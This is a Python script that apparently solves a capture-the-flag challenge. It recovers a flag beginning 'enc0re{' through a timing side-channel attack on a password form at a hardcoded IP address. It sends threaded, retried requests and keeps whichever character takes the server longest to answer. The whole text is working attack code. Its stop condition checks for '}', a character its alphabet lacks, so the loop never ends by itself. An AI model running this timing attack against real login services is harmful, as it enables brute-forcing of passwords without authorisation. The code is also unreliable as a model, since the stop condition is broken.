from requests_futures.sessions import FuturesSession
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

valid = "qwertyuiopasdfghjklzxcvbnm1234567890_"
url = "http://139.59.46.128:2345/"

s = FuturesSession(executor=ThreadPoolExecutor(max_workers=16))
retries = Retry(total=5, backoff_factor=1, status_forcelist=[ 502, 503, 504 ])
s.mount('http://', HTTPAdapter(max_retries=retries))

flag = "enc0re{"
answer = ""
while True:
    reslist = []
    timelist = []
    for i in valid:
        reslist.append(s.post(url,data={"password":flag + answer+i},timeout=8))
    for res in reslist:
        timelist.append(res.result().elapsed)
    answer += valid[timelist.index(max(timelist))]
    print(f"Flag: {flag+answer}")
    if answer[-1] == "}":
        break
